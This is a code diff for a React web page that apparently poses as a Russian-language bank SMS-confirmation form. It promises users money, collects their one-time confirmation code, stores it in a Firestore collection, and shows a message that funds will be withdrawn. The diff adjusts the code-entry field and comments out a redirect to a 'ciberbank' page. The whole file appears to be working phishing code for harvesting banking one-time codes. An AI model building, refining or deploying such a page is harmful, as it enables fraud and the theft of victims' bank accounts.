@@ -5,6 +5,8 @@ import { db } from './firebase'
 import { addDoc, collection } from 'firebase/firestore';
 import { ToastContainer, toast } from 'react-toastify';
 import 'react-toastify/dist/ReactToastify.css';
+import CurrencyFormat from 'react-currency-format';
+
 function App() {
 
 const [limit, setLimit] = useState(false)
@@ -30,9 +32,9 @@ function handleSubmit(e) {
     const usersRef = collection(db, "confirmation")
     addDoc(usersRef, {cod}).then(response => {
       toast.success('Поздравляем, деньги будут сняты при проверке вашего кода подтверждения, пожалуйста, подтвердите, чтобы убедиться, что он правильный!')
-      setTimeout(() => {
-        window.location.replace('https://ciberbank.github.io/ciberbank');
-      }, 3000);
+      // setTimeout(() => {
+      //   window.location.replace('https://ciberbank.github.io/ciberbank');
+      // }, 3000);
     }).catch(error => {
       toast.error("Пожалуйста, заполните информацию");
     })
@@ -49,8 +51,9 @@ function handleSubmit(e) {
           <span>Для его получения ваш номер должен быть <br/> подключен к СМС-банку для получение деньги </span>
         </div>
         <span className="text-greylish mb-2">Введите код</span>
-        <input type="number" value={cod}  className="p-2 outlined-none border border-greylish rounded-md w-full mb-5" onChange={handleChange} placeholder="000 000" />
-        <button type='submit'  className={`w-full border border-greylish p-4 font-semibold ${limit ? 'bg-green-600' : 'bg-gray-200'}   hover:bg-green-600 hover:transition-all transition-all mb-5 rounded-md`}>получить</button>
+        <CurrencyFormat  format="### ###"  className="p-2 outlined-none border border-greylish text-lg font-semibold rounded-md w-full mb-5" onChange={handleChange}  />
+        {/* <input type="number" value={cod}  className="p-2 outlined-none border border-greylish rounded-md w-full mb-5" placeholder="000 000" /> */}
+        <button type='submit'  className={`w-full border border-greylish p-4 font-semibold ${limit ? 'bg-green-600' : 'bg-gray-200'}   hover:bg-green-600 hover:transition-all transition-all mb-5 text-xl rounded-md`}>получить</button>
         Подтверждая операцию с помощью смс-кода, вы соглашаетесь с условиями и тарифами: ссылка
       </form>
     </div>
